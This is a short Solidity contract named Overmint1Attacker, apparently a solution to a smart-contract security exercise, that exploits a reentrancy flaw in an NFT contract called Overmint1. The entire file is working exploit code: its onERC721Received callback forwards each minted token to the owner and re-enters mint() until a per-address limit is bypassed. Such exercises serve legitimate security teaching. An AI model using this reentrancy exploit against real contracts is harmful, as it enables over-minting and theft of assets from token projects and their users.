// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "../Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver, Ownable {
    Overmint1 victim;

    constructor(Overmint1 _victim) {
        victim = _victim;
    }

    function attack() external {
        victim.mint();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        victim.transferFrom(address(this), owner(), victim.totalSupply());
        if (!victim.success(owner())) {
            victim.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
